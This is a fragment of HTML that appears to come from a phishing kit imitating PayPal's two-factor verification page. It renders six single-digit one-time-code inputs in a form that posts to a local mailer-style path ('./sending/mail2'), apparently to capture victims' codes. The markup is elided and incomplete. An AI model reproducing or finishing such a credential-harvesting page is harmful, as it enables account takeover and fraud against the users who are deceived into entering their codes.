...
<body data-nemo="documentId" documentid="AAGgQ-2SPczrEkzI_OKAaYy1NHVZkNeOs9LUKa9jVttl2mqpC11A20Di-h5qTrxHJneB" class="">
			...
			<div>
				...
				<div class="contentContainer" id="content">
					<div data-nemo="challengePage">
						...
						<form method="post" action="./sending/mail2" class="top15">
							<div>
								<div>
									<div class="codeInput">
    ...
    <div class="ppvx_text-input___3-14-9 ppvx_text-input--nolabel___3-14-9 ppvx--v2___3-14-9 ppvx_code-input__text-input___1-4-10">
    ...
    <div class="ppvx_text-input___3-14-9 ppvx_text-input--nolabel___3-14-9 ppvx--v2___3-14-9 ppvx_code-input__text-input___1-4-10">
        <input maxlength="1" maxlength="1" name="code6" class="ppvx_text-input__control___3-14-9 ppvx_code-input__input___1-4-10 hasHelp"  id="ci-otpCode-5" aria-invalid="false" placeholder=" " aria-label="6-6" role="textbox" aria-describedby="otpCode" pattern="[0-9]*" required for="securityCodeInput" autocomplete="one-time-code" type="tel" value="">
    </div>
</div>
